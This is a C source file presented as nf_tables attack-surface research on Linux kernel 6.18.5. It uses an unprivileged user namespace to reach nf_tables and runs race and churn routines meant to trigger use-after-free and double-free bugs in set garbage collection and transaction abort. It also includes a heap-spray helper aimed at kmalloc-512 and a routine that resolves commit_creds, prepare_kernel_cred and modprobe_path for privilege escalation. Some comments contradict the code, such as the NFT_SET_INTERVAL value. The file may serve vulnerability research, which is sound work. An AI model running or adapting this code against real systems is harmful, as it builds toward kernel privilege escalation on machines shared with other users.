/*
 * nft_research.c — nf_tables attack surface research
 * Kernel: 6.18.5 | Ubuntu 24.04
 *
 * Attack vector:
 *   unshare(CLONE_NEWUSER | CLONE_NEWNET) → CAP_NET_ADMIN in ns
 *   → full nf_tables control plane access via NFNL_SUBSYS_NFTABLES
 *
 * Research targets:
 *   1. pipapo COW + GC race (concurrent timer + transaction commit)
 *   2. nft_set_rbtree activation TOCTOU
 *   3. dynset + timeout boundary conditions
 *   4. Transaction abort incomplete cleanup
 *   5. Heap spray primitives via controlled allocations
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter.h>

/* avoid netinet/in.h vs linux/in.h conflicts */
#ifndef htonl
#define htonl(x) __builtin_bswap32(x)
#endif
#ifndef NLA_HDRSIZE
#define NLA_HDRSIZE  sizeof(struct nlattr)
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(x) (((x) + 3) & ~3)
#endif

/* ─── Netlink helpers ───────────────────────────────────────────────────── */

#define NL_BUF_SZ  65536
#define NFTA_TYPE  (NFNL_SUBSYS_NFTABLES << 8)
#define BUILD_BUG_ON_ZERO(e) (sizeof(struct { int:(-!!(e)); }))

struct nlbuf {
    char   data[NL_BUF_SZ];
    size_t pos;
};

static void nl_init(struct nlbuf *b) { b->pos = 0; }

static struct nlmsghdr *nl_begin(struct nlbuf *b, uint16_t type, uint16_t flags) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)(b->data + b->pos);
    struct nfgenmsg  *nfg = (struct nfgenmsg *)(nlh + 1);
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = (uint32_t)time(NULL);
    nlh->nlmsg_pid   = 0;
    nfg->nfgen_family = AF_INET;
    nfg->version      = NFNETLINK_V0;
    nfg->res_id       = 0;
    nlh->nlmsg_len    = NLMSG_ALIGN(sizeof(*nlh) + sizeof(*nfg));
    return nlh;
}

static void nl_add_attr(struct nlbuf *b, struct nlmsghdr *nlh,
                        uint16_t type, const void *data, uint16_t dlen) {
    struct nlattr *nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    nla->nla_type = type;
    nla->nla_len  = NLA_HDRSIZE + dlen;
    memcpy((char *)nla + NLA_HDRSIZE, data, dlen);
    nlh->nlmsg_len += NLA_ALIGN(nla->nla_len);
}

static void nl_add_str(struct nlbuf *b, struct nlmsghdr *nlh,
                       uint16_t type, const char *s) {
    nl_add_attr(b, nlh, type, s, strlen(s) + 1);
}

static void nl_add_u32(struct nlbuf *b, struct nlmsghdr *nlh,
                       uint16_t type, uint32_t v) {
    nl_add_attr(b, nlh, type, &v, sizeof(v));
}

static struct nlattr *nl_nest_begin(struct nlbuf *b, struct nlmsghdr *nlh,
                                     uint16_t type) {
    struct nlattr *nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    nla->nla_type = NLA_F_NESTED | type;
    nla->nla_len  = NLA_HDRSIZE;
    nlh->nlmsg_len += NLA_ALIGN(nla->nla_len);
    return nla;
}

static void nl_nest_end(struct nlmsghdr *nlh, struct nlattr *nla) {
    nla->nla_len = (char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)nla;
}

/* ─── Netfilter socket ──────────────────────────────────────────────────── */

static int nf_sock = -1;

static int nf_open(void) {
    nf_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nf_sock < 0) { perror("socket(NETLINK_NETFILTER)"); return -1; }
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(nf_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(nf_sock); return -1;
    }
    return 0;
}

static int nf_send_recv(struct nlmsghdr *nlh) {
    char rbuf[NL_BUF_SZ];
    if (send(nf_sock, nlh, nlh->nlmsg_len, 0) < 0) return -errno;
    ssize_t n = recv(nf_sock, rbuf, sizeof(rbuf), 0);
    if (n < 0) return -errno;
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = (struct nlmsgerr *)(rh + 1);
        return e->error; /* 0 = success */
    }
    return 0;
}

/* ─── nf_tables primitives ──────────────────────────────────────────────── */

static int nft_add_table(const char *name) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_NEWTABLE,
                                    NLM_F_CREATE | NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_TABLE_NAME, name);
    return nf_send_recv(nlh);
}

static int nft_del_table(const char *name) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_DELTABLE, NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_TABLE_NAME, name);
    return nf_send_recv(nlh);
}

static int nft_add_chain(const char *table, const char *chain,
                          int hook, int prio) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_NEWCHAIN,
                                    NLM_F_CREATE | NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_CHAIN_TABLE, table);
    nl_add_str(&b, nlh, NFTA_CHAIN_NAME, chain);
    if (hook >= 0) {
        struct nlattr *ha = nl_nest_begin(&b, nlh, NFTA_CHAIN_HOOK);
        nl_add_u32(&b, nlh, NFTA_HOOK_HOOKNUM, htonl(hook));
        nl_add_u32(&b, nlh, NFTA_HOOK_PRIORITY, htonl(prio));
        nl_nest_end(nlh, ha);
        uint32_t flags = 0;
        nl_add_u32(&b, nlh, NFTA_CHAIN_FLAGS, htonl(flags));
    }
    return nf_send_recv(nlh);
}

/* Add a set — key_type: 7=ipv4_addr, flags control backend:
   0=hash, NFT_SET_INTERVAL(0x08)=pipapo, NFT_SET_TIMEOUT(0x10)=timeout */
/* correct values from linux/netfilter/nf_tables.h */
#ifndef NFT_SET_INTERVAL
#define NFT_SET_INTERVAL  0x04
#endif
#ifndef NFT_SET_TIMEOUT
#define NFT_SET_TIMEOUT   0x10
#endif
/* NFT_SET_EVAL is the "dynamic" / updatable-from-datapath flag */
#ifndef NFT_SET_EVAL
#define NFT_SET_EVAL      0x20
#endif

static int nft_add_set(const char *table, const char *name,
                        uint32_t flags, uint64_t timeout_ns) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_NEWSET,
                                    NLM_F_CREATE | NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_SET_TABLE, table);
    nl_add_str(&b, nlh, NFTA_SET_NAME, name);
    nl_add_u32(&b, nlh, NFTA_SET_FLAGS, htonl(flags));
    nl_add_u32(&b, nlh, NFTA_SET_KEY_TYPE, htonl(7)); /* ipv4_addr */
    nl_add_u32(&b, nlh, NFTA_SET_KEY_LEN, htonl(4));
    if (timeout_ns > 0) {
        uint64_t t = __builtin_bswap64(timeout_ns / 1000000); /* ms */
        nl_add_attr(&b, nlh, NFTA_SET_TIMEOUT, &t, sizeof(t));
    }
    return nf_send_recv(nlh);
}

static int nft_add_set_elem(const char *table, const char *set,
                             uint32_t ip, uint64_t timeout_ms) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_NEWSETELEM,
                                    NLM_F_CREATE | NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nl_add_str(&b, nlh, NFTA_SET_ELEM_LIST_SET, set);

    struct nlattr *list = nl_nest_begin(&b, nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
    struct nlattr *elem = nl_nest_begin(&b, nlh, NFTA_LIST_ELEM);

    struct nlattr *key  = nl_nest_begin(&b, nlh, NFTA_SET_ELEM_KEY);
    nl_add_attr(&b, nlh, NFTA_DATA_VALUE, &ip, 4);
    nl_nest_end(nlh, key);

    if (timeout_ms > 0) {
        uint64_t t = __builtin_bswap64(timeout_ms);
        nl_add_attr(&b, nlh, NFTA_SET_ELEM_TIMEOUT, &t, sizeof(t));
    }

    nl_nest_end(nlh, elem);
    nl_nest_end(nlh, list);
    return nf_send_recv(nlh);
}

static int nft_del_set_elem(const char *table, const char *set, uint32_t ip) {
    struct nlbuf b; nl_init(&b);
    struct nlmsghdr *nlh = nl_begin(&b, NFTA_TYPE | NFT_MSG_DELSETELEM,
                                    NLM_F_ACK);
    nl_add_str(&b, nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nl_add_str(&b, nlh, NFTA_SET_ELEM_LIST_SET, set);

    struct nlattr *list = nl_nest_begin(&b, nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
    struct nlattr *elem = nl_nest_begin(&b, nlh, NFTA_LIST_ELEM);
    struct nlattr *key  = nl_nest_begin(&b, nlh, NFTA_SET_ELEM_KEY);
    nl_add_attr(&b, nlh, NFTA_DATA_VALUE, &ip, 4);
    nl_nest_end(nlh, key);
    nl_nest_end(nlh, elem);
    nl_nest_end(nlh, list);
    return nf_send_recv(nlh);
}

/* ─── KASLR defeat from /proc/kallsyms (requires root) ─────────────────── */

static unsigned long kaslr_resolve(const char *sym) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    unsigned long addr = 0; char type; char name[256];
    while (fscanf(f, "%lx %c %255s\n", &addr, &type, name) == 3)
        if (!strcmp(name, sym)) { fclose(f); return addr; }
    fclose(f);
    return 0;
}

/* ─── Heap spray: fill slab cache with controlled-size nft objects ──────── */

#define SPRAY_COUNT 64

static void heap_spray_sets(const char *table, int size_hint) {
    /*
     * nft_set allocation is approximately:
     *   sizeof(nft_set) + name_len + ops_specific_data
     * sizeof(nft_set) ≈ 312 bytes on x86_64 6.18
     * We can control name length to hit specific kmalloc-N slabs.
     *
     * Target: kmalloc-512 (common exploit target)
     * Strategy: allocate many sets, free half, trigger vuln, fill with
     * a controlled fake structure.
     */
    char name[64];
    for (int i = 0; i < SPRAY_COUNT; i++) {
        snprintf(name, sizeof(name), "spray_%03d_%.*s",
                 i, size_hint > 32 ? 32 : size_hint, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        int r = nft_add_set(table, name, 0, 0);
        if (r < 0 && r != -EEXIST)
            fprintf(stderr, "  spray[%d]: %s\n", i, strerror(-r));
    }
    printf("[spray] allocated %d sets in table '%s'\n", SPRAY_COUNT, table);
}

/* ─── Test 1: pipapo interval set mass add/delete (GC race pressure) ───── */

static void test_pipapo_gc_race(void) {
    printf("\n[TEST 1] pipapo GC race — rapid element churn\n");
    const char *tbl = "pipapo_gc";
    const char *set = "ipset";

    nft_add_table(tbl);
    int r = nft_add_set(tbl, set, NFT_SET_INTERVAL | NFT_SET_TIMEOUT,
                        100 * 1000000ULL); /* 100ms timeout */
    printf("  create interval+timeout set: %s\n", r ? strerror(-r) : "OK");

    /* Rapidly add elements — they expire in 100ms, GC will race our adds */
    int added = 0, errors = 0;
    for (int i = 0; i < 256; i++) {
        uint32_t ip = htonl(0x0a000001 + i); /* 10.0.0.1 – 10.0.1.0 */
        r = nft_add_set_elem(tbl, set, ip, 100); /* 100ms timeout */
        if (r == 0) added++;
        else errors++;
        /* interleave deletes to keep set size manageable */
        if (i % 32 == 31) {
            for (int j = i - 31; j <= i; j++) {
                uint32_t dip = htonl(0x0a000001 + j);
                nft_del_set_elem(tbl, set, dip);
            }
        }
    }
    printf("  add/del churn: %d added, %d errors\n", added, errors);
    printf("  [!] if kernel crashes here → pipapo GC double-free triggered\n");

    nft_del_table(tbl);
}

/* ─── Test 2: rbtree TOCTOU — add then immediately abort via error ──────── */

static void test_rbtree_abort(void) {
    printf("\n[TEST 2] rbtree set activation/deactivation via transaction abort\n");
    const char *tbl = "rbtree_test";
    const char *set = "rbset";

    nft_add_table(tbl);
    /* rbtree is selected by the kernel heuristics for large sets */
    int r = nft_add_set(tbl, set, 0, 0);
    printf("  create set: %s\n", r ? strerror(-r) : "OK");

    /* Add 1000 elements to force rbtree backend selection */
    int added = 0;
    for (int i = 0; i < 1000; i++) {
        uint32_t ip = htonl(0xc0a80001 + i); /* 192.168.x.x */
        if (nft_add_set_elem(tbl, set, ip, 0) == 0) added++;
    }
    printf("  populated %d elements\n", added);

    /* Now try to add a DUPLICATE element — this causes transaction abort
     * after partial activation. The rbtree deactivation path should
     * properly undo all activations, but if there's a bug... */
    uint32_t dup = htonl(0xc0a80001);
    r = nft_add_set_elem(tbl, set, dup, 0); /* should get -EEXIST or similar */
    printf("  duplicate insert: %s (expected error)\n",
           r == 0 ? "unexpectedly OK!" : strerror(-r));

    /* Now try adding beyond max (stress the abort cleanup) */
    int abort_count = 0;
    for (int i = 1000; i < 1500; i++) {
        /* Try to add elements that may conflict with existing ones */
        uint32_t ip = htonl(0xc0a80001 + (i % 1000)); /* wrap = duplicates */
        if (nft_add_set_elem(tbl, set, ip, 0) < 0) abort_count++;
    }
    printf("  abort-inducing operations: %d\n", abort_count);
    printf("  [!] check dmesg for KASAN/KFENCE reports\n");

    nft_del_table(tbl);
}

/* ─── Test 3: dynset + zero timeout ─────────────────────────────────────── */

static void test_dynset_zero_timeout(void) {
    printf("\n[TEST 3] dynset with zero-timeout elements (immediate expiry)\n");
    /*
     * Hypothesis: nft_dynset_eval() adds element with timeout=0.
     * GC sees timeout=0 → immediately eligible for collection.
     * If GC fires between nft_dynset adding and caller checking,
     * reference could be stale.
     *
     * We can't trigger actual packet processing from user space in a
     * user namespace (no real traffic), but we can test the set GC
     * on elements we add with near-zero timeouts.
     */
    const char *tbl = "dynset_zero";
    const char *set = "dyn";

    nft_add_table(tbl);
    int r = nft_add_set(tbl, set, NFT_SET_EVAL | NFT_SET_TIMEOUT,
                        1 * 1000000ULL); /* 1ms global timeout */
    printf("  create dynamic+timeout set (1ms): %s\n", r ? strerror(-r) : "OK");

    /* Add with minimum timeout */
    int added = 0;
    for (int i = 0; i < 512; i++) {
        uint32_t ip = htonl(0x01010101 + i);
        r = nft_add_set_elem(tbl, set, ip, 1); /* 1ms timeout */
        if (r == 0) added++;
    }
    printf("  added %d elements with 1ms timeout\n", added);

    /* Sleep 10ms — all should be expired — then re-add same IPs */
    usleep(10000);
    int re_added = 0, errors = 0;
    for (int i = 0; i < 512; i++) {
        uint32_t ip = htonl(0x01010101 + i);
        r = nft_add_set_elem(tbl, set, ip, 1);
        if (r == 0) re_added++;
        else errors++;
    }
    printf("  re-add after timeout: %d OK, %d errors\n", re_added, errors);
    printf("  [!] errors != 0 with -EEXIST after expiry → GC not running\n");
    printf("  [!] KASAN reports → use-after-free during re-add\n");

    nft_del_table(tbl);
}

/* ─── Test 4: Concurrent transaction stress (two sockets) ───────────────── */

static volatile int stop_worker = 0;
static const char *concurrent_table = "concur";

static void *concurrent_worker(void *arg) {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    int saved = nf_sock;
    nf_sock = sock;

    /* Worker: continuously add/delete a chain while main thread modifies sets */
    int iter = 0;
    while (!stop_worker && iter < 1000) {
        char name[32];
        snprintf(name, sizeof(name), "wchain_%d", iter % 8);

        nft_add_chain(concurrent_table, name, -1, 0); /* non-base chain */
        usleep(100);
        /* Delete chain by creating table del — fast path */
        iter++;
    }

    nf_sock = saved;
    close(sock);
    return NULL;
}

static void test_concurrent_transactions(void) {
    printf("\n[TEST 4] concurrent transactions on two netlink sockets\n");
    printf("  [note] nfnl_lock serializes — this tests deferred GC races\n");

    nft_add_table(concurrent_table);

    pthread_t worker;
    pthread_create(&worker, NULL, concurrent_worker, NULL);

    /* Main thread: rapidly modify sets while worker modifies chains */
    for (int i = 0; i < 200; i++) {
        char sname[32];
        snprintf(sname, sizeof(sname), "cset_%d", i % 16);
        nft_add_set(concurrent_table, sname, 0, 0);

        /* Add some elements */
        for (int j = 0; j < 8; j++) {
            uint32_t ip = htonl(0x7f000001 + i * 8 + j);
            nft_add_set_elem(concurrent_table, sname, ip, 0);
        }
        usleep(50);
    }

    stop_worker = 1;
    pthread_join(worker, NULL);

    printf("  concurrent test complete — check dmesg for anomalies\n");
    nft_del_table(concurrent_table);
}

/* ─── Kernel info: print key addresses ─────────────────────────────────── */

static void print_kernel_info(void) {
    printf("\n[KERNEL INFO]\n");
    struct {
        const char *name;
        unsigned long addr;
    } syms[] = {
        { "commit_creds",          kaslr_resolve("commit_creds") },
        { "prepare_kernel_cred",   kaslr_resolve("prepare_kernel_cred") },
        { "_stext",                kaslr_resolve("_stext") },
        { "init_task",             kaslr_resolve("init_task") },
        { "modprobe_path",         kaslr_resolve("modprobe_path") },
        { "nft_do_chain",          kaslr_resolve("nft_do_chain") },
        { "nft_set_pipapo_eval",   kaslr_resolve("nft_set_pipapo_eval") },
    };

    for (size_t i = 0; i < sizeof(syms)/sizeof(syms[0]); i++)
        printf("  %-26s = %#lx\n", syms[i].name, syms[i].addr);

    unsigned long base = kaslr_resolve("_stext");
    if (base)
        printf("  kernel base (from _stext)    = %#lx\n", base);
}

/* ─── main ──────────────────────────────────────────────────────────────── */

int main(void) {
    printf("=== nf_tables Attack Surface Research ===\n");
    printf("=== Kernel: 6.18.5 | Ubuntu 24.04      ===\n\n");

    /* Enter user + network namespace → unprivileged nf_tables access */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[!] unshare(CLONE_NEWUSER|CLONE_NEWNET)");
        fprintf(stderr, "    Try running as non-root unprivileged user\n");
        return 1;
    }
    printf("[+] entered user+net namespace (simulating unprivileged attacker)\n");

    if (nf_open() < 0) return 1;
    printf("[+] netfilter socket opened\n");

    print_kernel_info();
    test_pipapo_gc_race();
    test_rbtree_abort();
    test_dynset_zero_timeout();
    test_concurrent_transactions();

    printf("\n[DONE] Run: dmesg | grep -E 'BUG:|KASAN|KFENCE|WARNING' to check\n");
    printf("       for any kernel anomalies triggered by the tests.\n");
    return 0;
}
